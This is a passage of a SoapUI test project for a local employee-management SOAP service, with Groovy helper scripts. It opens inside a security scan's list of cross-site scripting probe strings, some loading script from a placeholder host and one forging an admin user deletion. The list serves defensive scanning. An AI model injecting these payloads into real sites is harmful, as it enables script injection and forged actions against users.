TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="CrosSiteScript" id="e7a048ab-90fa-42c7-929c-f3374463fb69" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:assertion type="Simple Contains" id="bad44c6c-dbc1-4ecb-8ece-8ea23dc8b595" name="Contains"><con:configuration><token>true</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="bat" parameterName="Username" xpath="//ns:name" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan></con:testStepSecurityTest><con:properties/></con:securityTest></con:testCase><con:testCase id="ba17668a-6dc9-4efb-8af7-1a45ced37878" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TC02" searchProperties="true"><con:settings/><con:testStep type="request" name="getemp1" id="b93f3f61-40fe-42a0-a639-c7d1aea2e470"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>EmployeeManagementServiceSoap12Binding</con:interface><con:operation>getEmployeeDetails</con:operation><con:request name="getemp1" id="3706cbeb-cdb6-4b01-8cce-06738c399239"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">
   <soap:Header/>
   <soap:Body>
      <typ:getEmployeeDetails>
         <!--Optional:-->
         <typ:employeeName>bat</typ:employeeName>
      </typ:getEmployeeDetails>
   </soap:Body>
</soap:Envelope>]]></con:request><con:assertion type="SOAP Response" id="a55d7fef-8568-4446-bb2c-951eef98fc7c"/><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:properties><con:property><con:name>id</con:name><con:value>256</con:value></con:property><con:property><con:name>salary</con:name><con:value>3000</con:value></con:property></con:properties></con:testCase><con:testCase id="2cdaa6e3-3cc3-4c85-8b0c-d876d1686eef" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TC03" searchProperties="true"><con:settings/><con:testStep type="groovy" name="GS01" id="7059e112-2f44-4567-b2c3-cebf37a567f1"><con:settings/><con:config><script>log.info"Hello World"
"Hello World"
log.info context.expand('${#TestCase#name1}')

log.info context.expand('${#TestCase#age}')
testRunner.testCase.testSuite.testCases["TC02"].getPropertyValue("ID")
testRunner.testCase.testSuite.testCases["TC02"].getPropertyValue("dep")
testRunner.testCase.testSuite.testCases["TC02"].testSteps["getemp1"].getPropertyValue("Request")
testRunner.testCase.testSuite.project.getPropertyValue("salary")
log.info testRunner.testCase.testSuite.project.setPropertyValue("salary","3000")
testRunner.testCase.testSuite.project.getPropertyValue("salary")
log.info testRunner.testCase.testSuite.project.setPropertyValue("donate","200")

</script></con:config></con:testStep><con:testStep type="groovy" name="AddEmployeeScript" id="70191db5-8e39-47b0-9784-ae00a4d15341"><con:settings/><con:config><script>import com.eviware.soapui.support.XmlHolder

def addReq=testRunner.testCase.testSuite.testCases["TC01"].testSteps["addemp1"].getPropertyValue("Request")

def id=testRunner.testCase.testSuite.testCases["TC01"].getPropertyValue("id")
def dept=testRunner.testCase.getPropertyValue("dept")
def xmlAdd=new XmlHolder(addReq)

xmlAdd.setNodeValue("//typ:addEmployee/typ:id","34")
xmlAdd.setNodeValue("//typ:addEmployee/typ:name","ffsfdkkk")
xmlAdd.setNodeValue("//typ:addEmployee/typ:Department",dept)
xmlAdd.setNodeValue("//typ:addEmployee/typ:age","32")
def newAddXML=xmlAdd.getXml();

testRunner.testCase.testSuite.testCases["TC01"].testSteps["addemp1"].setPropertyValue("Request",newAddXML)

import com.eviware.soapui.impl.wsdl.testcase.WsdlTestRunContext
def addTests=testRunner.testCase.testSuite.testCases["TC01"].testSteps["addemp1"]
def contextEmployeeAdd=new WsdlTestRunContext(addTests)
addTests.run(testRunner,contextEmployeeAdd)

//def vName=testRunner.testCase.testSuite.testCases["TC01"].getPropertyValue("name")
def vResponse=testRunner.testCase.testSuite.testCases["TC01"].testSteps["addemp1"].getPropertyValue("Response")
def vGetRes=new XmlHolder(vResponse)
def vNameRes=vGetRes.getNodeValue("//ns:return")
//assert vNameRes=="true"
if(vNameRes=="true")
{
	log.info('true');
	}
else
{
	log.info('employee already exist');
	}

</script></con:config></con:testStep><con:testStep type="groovy" name="GetEmployee" id="3caad738-e748-45bb-904b-338919aef5c2"><con:settings/><con:config><script>import com.eviware.soapui.support.XmlHolder

def addReq=testRunner.testCase.testSuite.testCases["TC02"].testSteps["getemp1"].getPropertyValue("Request")

def xmlAdd=new XmlHolder(addReq)

xmlAdd.setNodeValue("//typ:getEmployeeDetails/typ:employeeName","bat")
def newAddXML=xmlAdd.getXml();

testRunner.testCase.testSuite.testCases["TC02"].testSteps["getemp1"].setPropertyValue("Request",newAddXML)

import com.eviware.soapui.impl.wsdl.testcase.WsdlTestRunContext
def addTests=testRunner.testCase.testSuite.testCases["TC02"].testSteps["getemp1"]
def contextEmployeeAdd=new WsdlTestRunContext(addTests)
addTests.run(testRunner,contextEmployeeAdd)

def vName=testRunner.testCase.testSuite.testCases["TC01"].getPropertyValue("name")
def vResponse=testRunner.testCase.testSuite.testCases["TC02"].testSteps["getemp1"].getPropertyValue("Response")
def vGetRes=new XmlHolder(vResponse)
def vNameRes=vGetRes.getNodeValue("//ns:name")
assert vNameRes==vName

log.info vNameRes
</script></con:config></con:testStep><con:properties><con:property><con:name>name1</con:name><con:value>vikash</con:value></con:property><con:property><con:name>age</con:name><con:value>22</con:value></con:property><con:property><con:name>dept</con:name><con:value>testing</con:value></con:property></con:properties></con:testCase><con:testCase id="1035fff9-c601-43d9-bf1f-fbcd9f8d1f56" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TC04" searchProperties="true"><con:settings/><con:testStep type="groovy" name="RegScript" id="f4cc89ef-b13a-48d2-92f9-da4afc025a12"><con:settings/><con:config><script>def project=testRunner.testCase.testSuite.project
testRunner.runTestStep(project.testSuites['TS01'].testCases['TC03'].testSteps['AddEmployeeScript'])
testRunner.runTestStep(project.testSuites['TS01'].testCases['TC03'].testSteps['GetEmployee'])</script></con:config></con:testStep><con:properties/></con:testCase><con:properties/></con:testSuite><con:properties><con:property><con:name>salary</con:name><con:value>3000</con:value></con:property><con:property><con:name>donate</con:name><con:value>200</con:value></con:property></con:properties><con:wssContainer/><con:oAuth2ProfileContainer/><con:oAuth1ProfileContainer/><con:sensitiveInformation/></con:soapui-project>